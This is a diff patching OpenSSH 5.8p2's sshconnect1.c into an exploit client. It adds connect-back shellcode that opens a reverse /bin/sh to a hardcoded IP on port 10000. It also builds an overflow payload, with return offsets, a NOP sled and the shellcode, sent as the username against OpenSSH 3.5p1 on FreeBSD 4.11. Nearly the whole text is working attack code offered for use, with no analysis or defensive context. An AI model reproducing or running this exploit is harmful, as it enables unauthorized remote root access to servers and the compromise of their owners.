@@ -1,0 +1,60 @@
+root@debian:~# diff openssh-5.8p2/sshconnect1.c openssh-5.8p2_2/sshconnect1.c
+667a668,717
+// Connect Back Shellcode
+
+#define IPADDR "\xc0\xa8\x20\x80"
+#define PORT "\x27\x10" /* htons(10000) */
+
+char sc[] =
+"\x90\x90"
+"\x90\x90"
+"\x31\xc9" // xor ecx, ecx
+"\xf7\xe1" // mul ecx
+"\x51" // push ecx
+"\x41" // inc ecx
+"\x51" // push ecx
+"\x41" // inc ecx
+"\x51" // push ecx
+"\x51" // push ecx
+"\xb0\x61" // mov al, 97
+"\xcd\x80" // int 80h
+"\x89\xc3" // mov ebx, eax
+"\x68"IPADDR // push dword 0101017fh
+"\x66\x68"PORT // push word 4135
+"\x66\x51" // push cx
+"\x89\xe6" // mov esi, esp
+"\xb2\x10" // mov dl, 16
+"\x52" // push edx
+"\x56" // push esi
+"\x50" // push eax
+"\x50" // push eax
+"\xb0\x62" // mov al, 98
+"\xcd\x80" // int 80h
+"\x41" // inc ecx
+"\xb0\x5a" // mov al, 90
+"\x49" // dec ecx
+"\x51" // push ecx
+"\x53" // push ebx
+"\x53" // push ebx
+"\xcd\x80" // int 80h
+"\x41" // inc ecx
+"\xe2\xf5" // loop -10
+"\x51" // push ecx
+"\x68\x2f\x2f\x73\x68" // push dword 68732f2fh
+"\x68\x2f\x62\x69\x6e" // push dword 6e69622fh
+"\x89\xe3" // mov ebx, esp
+"\x51" // push ecx
+"\x54" // push esp
+"\x53" // push ebx
+"\x53" // push ebx
+"\xb0\xc4\x34\xff"
+"\xcd\x80"; // int 80h
+
+679a730,737
+char buffer[8096];
+
+// Offset is for FreeBSD-4.11 RELEASE OpenSSH 3.5p1
+memcpy(buffer, "AAAA\x58\xd8\x07\x08""CCCCDDDDEEEE\xd8\xd8\x07\x08""GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO", 24);
+memset(buffer+24, '\x90', 5000);
+memcpy(buffer+24+5000, sc, sizeof(sc));
+server_user=buffer;
